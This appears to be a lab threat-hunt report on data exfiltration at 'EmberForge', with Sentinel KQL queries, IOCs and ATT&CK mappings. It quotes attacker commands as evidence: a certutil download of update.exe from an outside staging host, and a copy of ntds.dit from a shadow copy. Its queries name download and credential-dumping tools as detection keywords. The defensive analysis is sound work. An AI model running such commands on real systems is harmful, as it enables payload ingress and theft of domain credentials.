# Threat Hunt Report – EmberForge Source Leak Investigation

# Environment Details

| Item                 | Value                                       |
| -------------------- | ------------------------------------------- |
| SIEM Platform        | Microsoft Sentinel                          |
| Workspace            | law-cyber-range                             |
| Investigation Window | 2026-01-30 21:00 UTC – 2026-01-31 00:00 UTC |
| Custom Log Table     | EmberForgeX_CL                              |

---
# Additional Sections – Investigation Objective & Hunt Tasks

---

# 1. Data Collection & Archive Creation

## Investigation Task

The objective was to identify:

* what sensitive data was targeted,
* where the data originated from,
* and how the attacker packaged the data before exfiltration.

The investigation focused on identifying archive creation activity and Living Off The Land compression techniques.

## What I Looked For

* PowerShell archive creation
* ZIP/RAR/7z activity
* Compression-related command lines
* Staging directories
* Built-in Windows compression utilities

---

# 2. Exfiltration Tool Discovery

## Investigation Task

The objective was to determine:

* what tool was used to exfiltrate the stolen data,
* whether the tool was legitimate software,
* and how the attacker transferred files externally.

## What I Looked For

* Cloud synchronization utilities
* File transfer tools
* External upload commands
* Repeated tool execution attempts
* Suspicious command-line arguments

---

# 3. Attacker Email Attribution

## Investigation Task

The objective was to identify:

* attacker-controlled cloud credentials,
* exposed authentication details,
* and attribution indicators left in command-line activity.

## What I Looked For

* rclone configuration activity
* Credential-related command lines
* Usernames and email addresses
* Configuration file creation activity
* Authentication parameters

---

# 4. Plaintext Credential Exposure

## Investigation Task

The objective was to determine whether:

* credentials were exposed in plaintext,
* command-line arguments leaked sensitive information,
* and operational security mistakes could aid attribution.

## What I Looked For

* Password arguments
* Authentication flags
* Inline credentials
* Failed execution attempts
* Insecure command-line usage

---

# 5. Exfiltration Destination IP

## Investigation Task

The objective was to correlate:

* the exfiltration process,
* outbound network activity,
* and the external IP address receiving stolen data.

## What I Looked For

* Sysmon network connection events
* Event ID 3 telemetry
* Process-to-network correlation
* Outbound connections from rclone.exe
* External destination IPs

---

# 6. Active Directory Credential Database Theft

## Investigation Task

The objective was to determine whether:

* the attacker accessed Domain Controller credential stores,
* volume shadow copy techniques were used,
* and Active Directory compromise occurred.

## What I Looked For

* NTDS references
* Shadow copy usage
* vssadmin activity
* Credential dumping indicators
* File copy operations involving ntds.dit

---

# 7. Staging Infrastructure Discovery

## Investigation Task

The objective was to identify:

* attacker-controlled infrastructure,
* how tools entered the environment,
* and whether the same external server was reused across hosts.

## What I Looked For

* Download utilities
* LOLBins used for tool transfer
* External URLs
* certutil activity
* PowerShell web requests
* Repeated external infrastructure references

---

# 8. DNS Infrastructure Correlation

## Investigation Task

The objective was to correlate:

* suspicious DNS activity,
* repeated external domains,
* and infrastructure linked to attacker operations.

## What I Looked For

* Sysmon DNS query events
* Event ID 22 telemetry
* External domains
* Repeated hostname lookups
* Non-corporate infrastructure

---


# 2. Data Collection & Archive Creation

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="908" height="304" alt="image" src="https://github.com/user-attachments/assets/b06ef146-9644-4c2b-9db0-c323ec49fc93" />


---

# 3. Exfiltration Tool Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="854" height="268" alt="image" src="https://github.com/user-attachments/assets/1f0bca93-d1b6-4944-8554-a0d25c3c247c" />


---

# 4. Attacker Email Attribution

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, EventCode_s, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="1074" height="339" alt="image" src="https://github.com/user-attachments/assets/2abbc38e-ec34-4f2a-a99a-8c0502e16897" />


---

# 5. Plaintext Credential Exposure

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />


---

# 6. Exfiltration Destination IP

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where Image_s has "rclone"
| project TimeGenerated,
          Computer,
          Image_s,
          DestinationIp_s,
          DestinationPort_s
| order by TimeGenerated asc
```

### Screenshot

<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />


---

# 7. Active Directory Credential Database Theft

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("vssadmin", "shadow", "ntds", "diskshadow", "copy")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

## Findings

| Artifact            | Value    |
| ------------------- | -------- |
| Credential Database | ntds.dit |

### Screenshot

(Add screenshot here)

---

# 8. Staging Infrastructure Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any (
    "Invoke-WebRequest",
    "iwr",
    "curl",
    "wget",
    "certutil",
    "bitsadmin",
    "download"
)
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
```

## Findings

| Artifact           | Value                   |
| ------------------ | ----------------------- |
| Staging Server     | sync.cloud-endpoint.net |
| Downloaded Payload | update.exe              |

### Screenshot

(Add screenshot here)

---

# 9. DNS Infrastructure Correlation

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "22"
| where QueryName_s !contains "emberforge.local"
| summarize count() by QueryName_s
| order by count_ desc
```


### Screenshot

<img width="876" height="277" alt="image" src="https://github.com/user-attachments/assets/d6d59adf-1c0f-4ae6-8a41-1e5da923bd81" />


---

# Indicators of Compromise (IOCs)

| Type                | Value                                                 |
| ------------------- | ----------------------------------------------------- |
| Domain              | sync.cloud-endpoint.net                               |
| IP Address          | 66.203.125.15                                         |
| Email               | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
| Tool                | rclone.exe                                            |
| Tool                | update.exe                                            |
| Archive             | gamedev.zip                                           |
| Sensitive Directory | C:\GameDev                                            |

---

# MITRE ATT&CK Techniques Observed

| Technique                     | ID        |
| ----------------------------- | --------- |
| PowerShell                    | T1059.001 |
| Command Shell                 | T1059.003 |
| Data from Local System        | T1005     |
| Archive via Utility           | T1560.001 |
| Exfiltration to Cloud Storage | T1567.002 |
| Ingress Tool Transfer         | T1105     |
| NTDS Credential Dumping       | T1003.003 |
| Unsecured Credentials         | T1552     |

---

# Conclusion

The investigation confirmed successful compromise activity involving:

* malicious tool transfer,
* archive staging,
* cloud exfiltration,
* credential exposure,
* and Active Directory credential theft.

The attacker leveraged Living Off The Land techniques and legitimate administrative tooling to evade detection while staging and exfiltrating sensitive company data.
